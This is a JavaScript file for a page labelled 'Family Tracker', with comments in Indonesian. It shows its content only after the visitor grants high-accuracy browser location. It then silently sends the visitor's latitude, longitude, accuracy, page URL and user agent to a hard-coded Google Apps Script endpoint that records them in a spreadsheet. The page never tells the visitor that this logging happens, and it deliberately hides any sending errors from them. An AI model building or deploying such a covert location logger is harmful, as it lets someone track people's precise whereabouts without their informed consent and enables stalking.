/* ============================================
   FAMILY TRACKER - script.js
   Logika:
   1. Saat halaman dibuka -> tampil loading
   2. Minta izin lokasi dari browser
   3. Jika diizinkan -> kirim ke Google Sheet -> tampilkan konten
   4. Jika ditolak/error -> tampilkan halaman "Akses Ditolak"
   ============================================ */

// === KONFIGURASI ===
const APPS_SCRIPT_URL =
  "https://script.google.com/macros/s/AKfycbyVcnpkIO0hctHh5ch3Vv_76hWwAl9i1KJUloh_r4AzvRG_ZokWo-DF1YEVZueHD4g/exec";

// Maksimal akurasi (meter). -1 = tidak ada batas.
// Catatan: 50m terlalu ketat untuk indoor/WiFi. Disarankan 500-1000m.
const MAX_ACCURACY_METERS = -1;

// === ELEMEN HALAMAN ===
const loadingScreen = document.getElementById("loading-screen");
const deniedScreen = document.getElementById("denied-screen");
const mainContent = document.getElementById("main-content");

// === JALANKAN SAAT HALAMAN SIAP ===
document.addEventListener("DOMContentLoaded", async () => {
  // Cek secure context (HTTPS atau localhost)
  if (!window.isSecureContext && !["localhost", "127.0.0.1"].includes(window.location.hostname)) {
    showDenied("Lokasi browser membutuhkan HTTPS atau localhost.");
    return;
  }

  // Cek dukungan Geolocation API
  if (!navigator.geolocation) {
    showDenied("Browser kamu tidak mendukung fitur lokasi.");
    return;
  }

  // Cek status izin (jika browser mendukung Permissions API)
  if (navigator.permissions) {
    try {
      const permission = await navigator.permissions.query({ name: "geolocation" });
      if (permission.state === "denied") {
        showDenied("Izin lokasi diblokir. Buka pengaturan situs lalu ubah Location menjadi Allow.");
        return;
      }
    } catch (error) {
      console.warn("Status izin lokasi tidak dapat diperiksa:", error);
    }
  }

  // Minta izin lokasi
  navigator.geolocation.getCurrentPosition(
    handleSuccess,
    handleError,
    {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumAge: 0
    }
  );
});

// === HANDLE: LOKASI BERHASIL DIDAPAT ===
async function handleSuccess(position) {
  const accuracy = Number(position.coords.accuracy);

  // Hanya cek akurasi jika MAX_ACCURACY_METERS > 0
  if (
    MAX_ACCURACY_METERS > 0 &&
    (!Number.isFinite(accuracy) || accuracy > MAX_ACCURACY_METERS)
  ) {
    showDenied(
      `Akurasi lokasi saat ini ${Math.round(accuracy || 0)} meter. ` +
      `Maksimal ${MAX_ACCURACY_METERS} meter. Aktifkan GPS dan coba di area terbuka.`
    );
    return;
  }

  const data = {
    timestamp: new Date().toISOString(),
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: Number.isFinite(accuracy) ? accuracy : 0,
    page: window.location.href,
    userAgent: navigator.userAgent
  };

  // Kirim ke Google Sheet (async, tapi tidak blocking tampilan)
  sendToSheet(data);

  // Tampilkan konten utama
  showMainContent();
}

// === HANDLE: LOKASI GAGAL / DITOLAK ===
function handleError(error) {
  let message = "";
  switch (error.code) {
    case 1:
      message = "Kamu menolak permintaan izin lokasi.";
      break;
    case 2:
      message = "Lokasi tidak tersedia. Pastikan GPS / lokasi diaktifkan di perangkatmu.";
      break;
    case 3:
      message = "Permintaan lokasi timeout. Coba lagi.";
      break;
    default:
      message = "Terjadi kesalahan tidak diketahui.";
  }
  showDenied(`${message} (kode ${error.code})`);
}

// === KIRIM DATA KE GOOGLE SHEET ===
async function sendToSheet(data) {
  if (!APPS_SCRIPT_URL || APPS_SCRIPT_URL === "PASTE_APPS_SCRIPT_URL_HERE") {
    console.warn("Google Sheet belum terhubung: isi APPS_SCRIPT_URL di config.local.js");
    return;
  }

  try {
    // Pakai mode "no-cors" karena Apps Script tidak mengizinkan CORS preflight
    // Browser tidak bisa membaca response dalam mode ini
    await fetch(APPS_SCRIPT_URL, {
      method: "POST",
      mode: "no-cors",
      headers: {
        "Content-Type": "text/plain;charset=utf-8"
      },
      body: JSON.stringify(data)
    });
    console.log("Permintaan pengiriman data lokasi ke Google Sheet telah dikirim.");
  } catch (err) {
    // Jangan tampilkan error ke user - tetap berikan akses ke konten
    console.warn("Gagal kirim ke Sheet:", err);
  }
}

// === TAMPILKAN KONTEN UTAMA ===
function showMainContent() {
  loadingScreen.classList.add("hidden");
  deniedScreen.classList.add("hidden");
  mainContent.classList.remove("hidden");
}

// === TAMPILKAN HALAMAN AKSES DITOLAK ===
function showDenied(reason) {
  loadingScreen.classList.add("hidden");
  mainContent.classList.add("hidden");
  deniedScreen.classList.remove("hidden");

  // Hapus pesan alasan sebelumnya (kalau ada)
  const oldReason = deniedScreen.querySelector(".runtime-reason");
  if (oldReason) oldReason.remove();

  if (reason) {
    const reasonP = document.createElement("p");
    reasonP.className = "hint runtime-reason";
    reasonP.textContent = "Alasan: " + reason;
    const box = deniedScreen.querySelector(".overlay-box");
    box.appendChild(reasonP);
  }
}